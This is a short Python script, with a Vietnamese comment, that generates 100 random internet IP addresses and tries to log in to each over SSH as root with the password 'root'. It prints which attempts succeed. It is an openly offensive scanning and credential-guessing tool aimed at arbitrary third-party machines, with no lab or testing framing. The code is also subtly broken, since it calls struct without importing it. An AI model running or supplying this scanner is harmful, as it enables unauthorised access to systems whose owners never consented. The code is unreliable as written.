import paramiko
import random
import socket

def generate_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def brute_ssh(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
        print(f"[*] Successfully logged in to {ip} with {username}/{password}")
        ssh.close()
    except paramiko.AuthenticationException:
        print(f"[-] Failed to log in to {ip} with {username}/{password}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    for _ in range(100):  # Thực hiện 100 lần để tạo ra 100 cặp IP:port
        ip = generate_random_ip()
        brute_ssh(ip, "root", "root")
